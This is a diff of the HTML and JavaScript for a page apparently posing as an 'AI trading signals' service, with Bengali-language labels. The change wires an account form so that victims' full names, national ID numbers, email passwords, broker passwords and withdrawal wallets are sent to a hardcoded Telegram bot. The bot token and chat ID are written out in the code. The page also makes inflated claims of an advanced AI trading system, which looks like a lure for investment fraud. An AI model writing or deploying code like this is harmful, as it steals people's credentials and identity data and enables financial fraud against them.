@@ -15,14 +15,11 @@
 </head>
 <body class="bg-[#0b0e14] text-white font-sans min-h-screen">
     
-    <!-- 🔊 প্রিমিয়াম অ্যালার্ট সাউন্ড -->
     <audio id="alertSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
 
-    <!-- 🌟 মেনুবার -->
     <nav class="bg-[#0d1117] border-b border-gray-800 sticky top-0 z-50 shadow-lg">
         <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
             <div class="flex justify-between h-16 items-center">
-                <!-- Logo -->
                 <div class="flex items-center gap-2">
                     <div class="w-8 h-8 bg-gradient-to-br from-blue-500 to-blue-700 rounded text-white flex items-center justify-center font-black italic text-xl shadow-[0_0_10px_rgba(59,130,246,0.5)]">B</div>
                     <div class="flex flex-col leading-none">
@@ -31,7 +28,6 @@
                     </div>
                 </div>
 
-                <!-- Desktop Menu Links -->
                 <div class="hidden md:flex items-center space-x-6 text-sm font-medium text-gray-300">
                     <button onclick="switchTab('home')" class="nav-btn hover:text-white flex items-center gap-1.5 transition">Home</button>
                     <button onclick="switchTab('signals')" class="nav-btn text-white flex items-center gap-1.5 transition border-b-2 border-blue-500">Signals</button>
@@ -40,13 +36,11 @@
                     <a href="https://t.me/Blackshoter10" target="_blank" class="hover:text-white flex items-center gap-1.5 transition">Support</a>
                 </div>
 
-                <!-- Logout -->
                 <div class="flex items-center gap-3">
                     <a href="/" class="text-red-400 text-xs md:text-sm font-semibold hover:text-red-300">Logout</a>
                 </div>
             </div>
 
-            <!-- Mobile Menu -->
             <div class="md:hidden flex overflow-x-auto hide-scrollbar pb-3 space-x-4 text-xs font-medium text-gray-400">
                 <button onclick="switchTab('home')" class="nav-btn-mob hover:text-white whitespace-nowrap px-2 py-1">Home</button>
                 <button onclick="switchTab('signals')" class="nav-btn-mob text-white whitespace-nowrap px-2 py-1 border-b border-blue-500">Signals</button>
@@ -57,17 +51,13 @@
         </div>
     </nav>
 
-    <!-- মূল কন্টেন্ট এরিয়া -->
     <div class="max-w-md mx-auto p-4 mt-2">
         
-        <!-- 🌍 ১. HOME SECTION (3D Animation) -->
+        <!-- 🌍 ১. HOME SECTION -->
         <div id="home" class="tab-content">
             <div class="bg-[#161b22] border border-gray-800 rounded-xl p-1 shadow-lg overflow-hidden relative">
                 <p class="absolute top-4 left-4 z-10 text-xs bg-black/60 px-2 py-1 rounded text-white font-bold tracking-widest border border-gray-700">LIVE SATELLITE VIEW</p>
-                <!-- রিয়েল আর্থ স্পিনিং ও স্যাটেলাইট ভিডিও -->
-                <video autoplay loop muted playsinline class="w-full h-64 object-cover rounded-lg opacity-90">
-                    <source src="https://assets.mixkit.co/videos/preview/mixkit-planet-earth-spinning-in-space-4133-large.mp4" type="video/mp4">
-                </video>
+                <img src="https://i.pinimg.com/originals/c9/22/68/c92268d92cf2dbf96e3195683d9e14fb.gif" class="w-full h-64 object-cover rounded-lg opacity-80 mix-blend-screen" alt="Satellite View">
                 <div class="p-4 text-center">
                     <h2 class="text-xl font-bold mb-2">Welcome to Black Shoter AI</h2>
                     <p class="text-xs text-gray-400">World's most advanced AI trading system. Real-time market data synchronized.</p>
@@ -75,7 +65,7 @@
             </div>
         </div>
 
-        <!-- 📊 ২. SIGNALS SECTION (Original Bot) -->
+        <!-- 📊 ২. SIGNALS SECTION -->
         <div id="signals" class="tab-content active-tab">
             <div class="bg-[#161b22] border border-gray-800 rounded-xl p-4 mb-6 shadow-lg">
                 <p class="text-xs text-blue-400 font-bold mb-1">AI SYSTEM ACTIVE</p>
@@ -103,9 +93,7 @@
                     </div>
                 </div>
 
-                <div class="space-y-4 border border-gray-800 rounded-lg p-4 bg-[#0d1117] mb-6" id="signal-details">
-                    <!-- Data will show here -->
-                </div>
+                <div class="space-y-4 border border-gray-800 rounded-lg p-4 bg-[#0d1117] mb-6" id="signal-details"></div>
 
                 <button onclick="fetchSignal()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg transition tracking-wide">
                     Refresh Signal
@@ -118,7 +106,7 @@
             </div>
         </div>
 
-        <!-- 📝 ৩. AI TRADING ACCOUNT (Form matching Image) -->
+        <!-- 📝 ৩. AI TRADING ACCOUNT -->
         <div id="ai-account" class="tab-content">
             <div class="bg-[#161b22] border border-gray-800 rounded-xl p-5 shadow-lg">
                 <div class="flex items-center gap-3 mb-6 border-b border-gray-800 pb-4">
@@ -131,160 +119,156 @@
                     </div>
                 </div>
 
-                <form class="space-y-4" onsubmit="alert('আপনার ফর্মটি সফলভাবে সাবমিট হয়েছে!'); return false;">
-                    <div><label class="text-xs font-bold text-gray-300">১. পেমেন্ট আইডি (Payment ID)</label><input type="text" class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="অফিসিয়াল ওয়ালেট একাউন্ট"></div>
-                    <div><label class="text-xs font-bold text-gray-300">২. আপনার নাম (Your Name)</label><input type="text" class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="আপনার পূর্ণ নাম লিখুন"></div>
-                    <div><label class="text-xs font-bold text-gray-300">৩. টেলিগ্রাম আইডি (Telegram ID)</label><input type="text" class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="@username লিখুন"></div>
-                    <div><label class="text-xs font-bold text-gray-300">৪. ডিপোজিট এমাউন্ট (Deposit Amount)</label><input type="number" class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="যেমন: 50, 100, 200 ... (USD)"></div>
-                    <div><label class="text-xs font-bold text-gray-300">৫. এন আইডি নাম্বার (NID Number)</label><input type="text" class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="আপনার ১০/১৩ ডিজিটের এন আইডি"></div>
-                    <div><label class="text-xs font-bold text-gray-300">৬. ইমেইল (Email)</label><input type="email" class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="example@email.com"></div>
-                    <div><label class="text-xs font-bold text-gray-300">৭. পাসওয়ার্ড (Password)</label><input type="password" class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="পাসওয়ার্ড তৈরি করুন"></div>
+                <form id="aiForm" class="space-y-4" onsubmit="submitForm(event)">
+                    <div><label class="text-xs font-bold text-gray-300">১. পেমেন্ট আইডি (Payment ID)</label><input type="text" id="f1" required class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="অফিসিয়াল ওয়ালেট একাউন্ট"></div>
+                    <div><label class="text-xs font-bold text-gray-300">২. আপনার নাম (Your Name)</label><input type="text" id="f2" required class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="আপনার পূর্ণ নাম লিখুন"></div>
+                    <div><label class="text-xs font-bold text-gray-300">৩. টেলিগ্রাম আইডি (Telegram ID)</label><input type="text" id="f3" required class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="@username লিখুন"></div>
+                    <div><label class="text-xs font-bold text-gray-300">৪. ডিপোজিট এমাউন্ট (Deposit Amount)</label><input type="number" id="f4" required class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="যেমন: 50, 100, 200 ... (USD)"></div>
+                    <div><label class="text-xs font-bold text-gray-300">৫. এন আইডি নাম্বার (NID Number)</label><input type="text" id="f5" required class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="আপনার ১০/১৩ ডিজিটের এন আইডি"></div>
+                    <div><label class="text-xs font-bold text-gray-300">৬. ইমেইল (Email)</label><input type="email" id="f6" required class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="example@email.com"></div>
+                    <div><label class="text-xs font-bold text-gray-300">৭. পাসওয়ার্ড (Password)</label><input type="password" id="f7" required class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="পাসওয়ার্ড তৈরি করুন"></div>
                     <div><label class="text-xs font-bold text-gray-300">৮. কোন ব্রোকারে একাউন্ট করবেন (Broker)</label>
-                        <select class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none">
-                            <option>ব্রোকার সিলেক্ট করুন</option><option>Kotex</option><option>Exness</option><option>MT4</option><option>MT5</option>
+                        <select id="f8" required class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none">
+                            <option value="">ব্রোকার সিলেক্ট করুন</option><option value="Kotex">Kotex</option><option value="Exness">Exness</option><option value="MT4">MT4</option><option value="MT5">MT5</option>
                         </select>
                     </div>
-                    <div><label class="text-xs font-bold text-gray-300">৯. ব্রোকার পাসওয়ার্ড (Broker Password)</label><input type="password" class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="আপনার ব্রোকার পাসওয়ার্ড দিন"></div>
-                    <div><label class="text-xs font-bold text-gray-300">১০. উইথড্র ওয়ালেট (Withdraw Wallet)</label><input type="text" class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="যেমন: TRC20 - (USDT)"></div>
+                    <div><label class="text-xs font-bold text-gray-300">৯. ব্রোকার পাসওয়ার্ড (Broker Password)</label><input type="password" id="f9" required class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="আপনার ব্রোকার পাসওয়ার্ড দিন"></div>
+                    <div><label class="text-xs font-bold text-gray-300">১০. উইথড্র ওয়ালেট (Withdraw Wallet)</label><input type="text" id="f10" required class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none" placeholder="যেমন: TRC20 - (USDT)"></div>
                     <div><label class="text-xs font-bold text-gray-300">১১. উইথড্র পিরিয়ড (Withdraw Period)</label>
-                        <select class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none">
-                            <option>1 Day</option><option>2 Days</option><option>3 Days</option><option>5 Days</option><option>10 Days</option>
+                        <select id="f11" required class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none">
+                            <option value="">সিলেক্ট করুন</option><option value="1 Day">1 Day</option><option value="2 Days">2 Days</option><option value="3 Days">3 Days</option><option value="5 Days">5 Days</option><option value="10 Days">10 Days</option>
                         </select>
                     </div>
-                    <button type="submit" class="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-3 rounded-lg transition mt-4">✓ কনফার্ম করুন</button>
+                    <button type="submit" id="submitBtn" class="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-3 rounded-lg transition mt-4">✓ কনফার্ম করুন</button>
                 </form>
             </div>
         </div>
 
-        <!-- 🧮 ৪. DASHBOARD (Money Management Calculator) -->
+        <!-- 🧮 ৪. DASHBOARD -->
         <div id="dashboard" class="tab-content">
             <div class="bg-[#161b22] border border-gray-800 rounded-xl p-5 shadow-lg">
                 <h2 class="font-bold text-lg mb-1">Money Management</h2>
                 <p class="text-xs text-gray-400 mb-6">আপনার ডিপোজিট অনুযায়ী ট্রেডিং প্ল্যান তৈরি করুন।</p>
-                
                 <div class="mb-4">
                     <label class="text-xs font-bold text-gray-300">Total Capital (USD)</label>
                     <input type="number" id="capitalInput" class="w-full mt-1 bg-[#0d1117] border border-gray-700 rounded-lg p-3 text-white font-bold focus:border-blue-500 outline-none" placeholder="Enter Deposit Amount (e.g. 100)">
                 </div>
                 <button onclick="calculateMM()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-2.5 rounded-lg transition mb-6">Generate Plan</button>
-
                 <div id="mm-result" class="hidden space-y-3 border border-gray-800 rounded-lg p-4 bg-[#0d1117]">
-                    <div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">Recommended Lot (Gold):</span><span id="calc-lot" class="font-bold text-blue-400">0.01</span></div>
+                    <div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">Recommended Lot:</span><span id="calc-lot" class="font-bold text-blue-400">0.01</span></div>
                     <hr class="border-gray-800/50">
                     <div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">Max Risk Per Trade (2%):</span><span id="calc-risk" class="font-bold text-red-400">-$2.00</span></div>
                     <hr class="border-gray-800/50">
-                    <div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">Daily Profit Target (5%):</span><span id="calc-target" class="font-bold text-green-400">+$5.00</span></div>
-                    <hr class="border-gray-800/50">
-                    <div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">Max Trades Per Day:</span><span class="font-bold text-white">3 to 5</span></div>
+                    <div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">Daily Target (5%):</span><span id="calc-target" class="font-bold text-green-400">+$5.00</span></div>
                 </div>
             </div>
         </div>
 
     </div>
 
-    <!-- 🧠 Scripts -->
     <script>
-        // 🔄 Tab Switching Logic
+        // 🔄 Tab Switching
         function switchTab(tabId) {
             document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active-tab'));
             document.getElementById(tabId).classList.add('active-tab');
-            
-            // Update Active Menu Styling
             document.querySelectorAll('.nav-btn, .nav-btn-mob').forEach(btn => {
                 btn.classList.remove('border-b-2', 'border-b', 'border-blue-500', 'text-white');
-                btn.classList.add('text-gray-300'); // Default color
+                btn.classList.add('text-gray-300');
             });
             event.currentTarget.classList.add('text-white');
-            if(window.innerWidth > 768) {
-                event.currentTarget.classList.add('border-b-2', 'border-blue-500');
-            } else {
-                event.currentTarget.classList.add('border-b', 'border-blue-500');
-            }
+            if(window.innerWidth > 768) { event.currentTarget.classList.add('border-b-2', 'border-blue-500'); } 
+            else { event.currentTarget.classList.add('border-b', 'border-blue-500'); }
         }
 
-        // 🧮 Money Management Calculator
+        // 📝 Telegram Form Submit Logic (আপনার দেওয়া টোকেন ও আইডি বসানো হয়েছে)
+        function submitForm(event) {
+            event.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.innerText = "Sending Data...";
+
+            // আপনার বটের Token এবং Chat ID
+            const botToken = "8527725513:AAH9wF2xZ8cBN_QUFmjuCYEiFvEXzBa_UOY"; 
+            const chatId = "7204862590";
+
+            const message = `🔔 *New VIP Account Form!*\n\n` +
+                `1. Payment ID: ${document.getElementById('f1').value}\n` +
+                `2. Name: ${document.getElementById('f2').value}\n` +
+                `3. Telegram: ${document.getElementById('f3').value}\n` +
+                `4. Deposit: $${document.getElementById('f4').value}\n` +
+                `5. NID: ${document.getElementById('f5').value}\n` +
+                `6. Email: ${document.getElementById('f6').value}\n` +
+                `7. Password: ${document.getElementById('f7').value}\n` +
+                `8. Broker: ${document.getElementById('f8').value}\n` +
+                `9. Broker Pass: ${document.getElementById('f9').value}\n` +
+                `10. Wallet: ${document.getElementById('f10').value}\n` +
+                `11. Withdraw: ${document.getElementById('f11').value}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({chat_id: chatId, text: message, parse_mode: "Markdown"})
+            }).then(res => {
+                alert('আপনার ফর্মটি সফলভাবে এডমিনের কাছে পাঠানো হয়েছে!');
+                document.getElementById('aiForm').reset();
+                btn.innerText = "✓ কনফার্ম করুন";
+            }).catch(err => {
+                alert('Error sending data!');
+                btn.innerText = "✓ কনফার্ম করুন";
+            });
+        }
+
+        // 🧮 Calculator
         function calculateMM() {
             const capital = parseFloat(document.getElementById('capitalInput').value);
             if(capital > 0) {
-                const risk = (capital * 0.02).toFixed(2); // 2% Risk
-                const target = (capital * 0.05).toFixed(2); // 5% Target
-                let lot = (capital / 10000).toFixed(2); // Standard safe rule
-                if (lot < 0.01) lot = 0.01;
-                
-                document.getElementById('calc-risk').innerText = `-$${risk}`;
-                document.getElementById('calc-target').innerText = `+$${target}`;
-                document.getElementById('calc-lot').innerText = lot;
+                document.getElementById('calc-risk').innerText = `-$${(capital * 0.02).toFixed(2)}`;
+                document.getElementById('calc-target').innerText = `+$${(capital * 0.05).toFixed(2)}`;
+                document.getElementById('calc-lot').innerText = Math.max(0.01, (capital / 10000)).toFixed(2);
                 document.getElementById('mm-result').classList.remove('hidden');
             }
         }
 
-        // 🤖 AI Logic & Fetching (অপরিবর্তিত)
+        // 🤖 Bot Logic
         let lastAction = "WAIT ⏳";
-
         function updateTime() { document.getElementById('currentTime').innerText = new Date().toLocaleTimeString(); }
         setInterval(updateTime, 1000);
 
-        document.addEventListener('DOMContentLoaded', () => {
-            if (Notification.permission !== "denied" && Notification.permission !== "granted") {
-                Notification.requestPermission();
-            }
-        });
-
         function fetchSignal() {
-            fetch('/api/get_signal')
-                .then(res => res.json())
-                .then(data => {
-                    document.getElementById('ai-message').innerText = data.message;
-                    document.getElementById('asset-name').innerText = data.asset;
-                    document.getElementById('signal-type').innerText = data.type ? (data.type + " SIGNAL") : "WAITING SIGNAL";
-                    
-                    const badge = document.getElementById('action-badge');
-                    badge.innerText = data.action;
-                    
-                    if(data.action.includes("BUY") || data.action.includes("UP")) {
-                        badge.className = "px-3 py-1.5 bg-green-900/80 text-green-400 rounded font-bold text-sm border border-green-500 animate-pulse";
-                    } else if(data.action.includes("SELL") || data.action.includes("DOWN")) {
-                        badge.className = "px-3 py-1.5 bg-red-900/80 text-red-400 rounded font-bold text-sm border border-red-500 animate-pulse";
-                    } else {
-                        badge.className = "px-3 py-1.5 bg-gray-800 text-gray-300 rounded font-bold text-sm border border-gray-700";
-                    }
+            fetch('/api/get_signal').then(res => res.json()).then(data => {
+                document.getElementById('ai-message').innerText = data.message;
+                document.getElementById('asset-name').innerText = data.asset;
+                document.getElementById('signal-type').innerText = data.type ? (data.type + " SIGNAL") : "WAITING SIGNAL";
+                const badge = document.getElementById('action-badge');
+                badge.innerText = data.action;
+                
+                if(data.action.includes("BUY") || data.action.includes("UP")) badge.className = "px-3 py-1.5 bg-green-900/80 text-green-400 rounded font-bold text-sm border border-green-500 animate-pulse";
+                else if(data.action.includes("SELL") || data.action.includes("DOWN")) badge.className = "px-3 py-1.5 bg-red-900/80 text-red-400 rounded font-bold text-sm border border-red-500 animate-pulse";
+                else badge.className = "px-3 py-1.5 bg-gray-800 text-gray-300 rounded font-bold text-sm border border-gray-700";
 
-                    if (data.action !== "WAIT ⏳" && lastAction === "WAIT ⏳") {
-                        document.getElementById('alertSound').play().catch(e => console.log("Audio play blocked"));
-                        try {
-                            if (Notification.permission === "granted") {
-                                new Notification("🔥 VIP Signal Alert!", { body: `${data.asset} - ${data.action} Live!`, icon: "https://cdn-icons-png.flaticon.com/512/2950/2950150.png" });
-                            }
-                        } catch (error) {}
-                    }
-                    lastAction = data.action;
+                if (data.action !== "WAIT ⏳" && lastAction === "WAIT ⏳") {
+                    document.getElementById('alertSound').play().catch(e => console.log("Audio play blocked"));
+                    try { if (Notification.permission === "granted") new Notification("🔥 VIP Signal Alert!", { body: `${data.asset} - ${data.action} Live!`, icon: "https://cdn-icons-png.flaticon.com/512/2950/2950150.png" }); } catch (error) {}
+                }
+                lastAction = data.action;
 
-                    const detailsBox = document.getElementById('signal-details');
-                    if(data.type === "FOREX") {
-                        detailsBox.innerHTML = `<div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">ENTRY:</span><span class="font-bold text-white">${data.entry}</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-green-500 font-bold">TP 1:</span><span class="font-bold text-green-400">${data.tp1}</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-green-500 font-bold">TP 2:</span><span class="font-bold text-green-400">${data.tp2}</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-red-500 font-bold">SL:</span><span class="font-bold text-red-400">${data.sl}</span></div>`;
-                    } else if (data.type === "BINARY") {
-                        detailsBox.innerHTML = `<div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">TIMEFRAME:</span><span class="font-bold text-white">${data.timeframe}</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">PAYOUT:</span><span class="font-bold text-white">${data.payout}</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-blue-400 font-bold">STATUS:</span><span class="font-bold text-blue-400">${data.status}</span></div>`;
-                    } else {
-                        detailsBox.innerHTML = `<div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">TIMEFRAME:</span><span class="font-bold text-gray-500">--</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">PAYOUT:</span><span class="font-bold text-gray-500">--</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-blue-400 font-bold">STATUS:</span><span class="font-bold text-gray-500">Connecting...</span></div>`;
-                    }
+                const detailsBox = document.getElementById('signal-details');
+                if(data.type === "FOREX") detailsBox.innerHTML = `<div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">ENTRY:</span><span class="font-bold text-white">${data.entry}</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-green-500 font-bold">TP 1:</span><span class="font-bold text-green-400">${data.tp1}</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-green-500 font-bold">TP 2:</span><span class="font-bold text-green-400">${data.tp2}</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-red-500 font-bold">SL:</span><span class="font-bold text-red-400">${data.sl}</span></div>`;
+                else if (data.type === "BINARY") detailsBox.innerHTML = `<div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">TIMEFRAME:</span><span class="font-bold text-white">${data.timeframe}</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">PAYOUT:</span><span class="font-bold text-white">${data.payout}</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-blue-400 font-bold">STATUS:</span><span class="font-bold text-blue-400">${data.status}</span></div>`;
+                else detailsBox.innerHTML = `<div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">TIMEFRAME:</span><span class="font-bold text-gray-500">--</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-gray-400 font-bold">PAYOUT:</span><span class="font-bold text-gray-500">--</span></div><hr class="border-gray-800/50"><div class="flex justify-between items-center"><span class="text-xs text-blue-400 font-bold">STATUS:</span><span class="font-bold text-gray-500">Connecting...</span></div>`;
 
-                    const historyList = document.getElementById('history-list');
-                    if(data.history && data.history.length > 0) {
-                        historyList.innerHTML = "";
-                        data.history.forEach(trade => {
-                            let resultColor = "text-gray-400";
-                            if(trade.result.includes("WIN")) resultColor = "text-green-400";
-                            if(trade.result.includes("LOSS")) resultColor = "text-red-400";
-                            if(trade.result.includes("Running")) resultColor = "text-yellow-400";
-                            historyList.innerHTML += `<div class="flex justify-between items-center bg-[#0d1117] p-3 rounded-lg border border-gray-800 shadow-sm"><div><p class="text-xs text-gray-500">${trade.time}</p><p class="font-bold text-sm">${trade.asset} <span class="text-xs ${trade.action.includes('BUY') ? 'text-green-500' : 'text-red-500'}">${trade.action}</span></p></div><div class="text-right"><p class="font-bold text-sm ${resultColor}">${trade.result}</p><p class="text-xs text-gray-500">Entry: ${trade.entry}</p></div></div>`;
-                        });
-                    } else {
-                        historyList.innerHTML = '<p class="text-sm text-gray-500 text-center py-2">No history yet.</p>';
-                    }
-                })
-                .catch(err => console.log(err));
+                const historyList = document.getElementById('history-list');
+                if(data.history && data.history.length > 0) {
+                    historyList.innerHTML = "";
+                    data.history.forEach(trade => {
+                        let resultColor = "text-gray-400";
+                        if(trade.result.includes("WIN")) resultColor = "text-green-400";
+                        if(trade.result.includes("LOSS")) resultColor = "text-red-400";
+                        if(trade.result.includes("Running")) resultColor = "text-yellow-400";
+                        historyList.innerHTML += `<div class="flex justify-between items-center bg-[#0d1117] p-3 rounded-lg border border-gray-800 shadow-sm"><div><p class="text-xs text-gray-500">${trade.time}</p><p class="font-bold text-sm">${trade.asset} <span class="text-xs ${trade.action.includes('BUY') ? 'text-green-500' : 'text-red-500'}">${trade.action}</span></p></div><div class="text-right"><p class="font-bold text-sm ${resultColor}">${trade.result}</p><p class="text-xs text-gray-500">Entry: ${trade.entry}</p></div></div>`;
+                    });
+                } else historyList.innerHTML = '<p class="text-sm text-gray-500 text-center py-2">No history yet.</p>';
+            }).catch(err => console.log(err));
         }
-
         fetchSignal();
         setInterval(fetchSignal, 30000);
     </script>
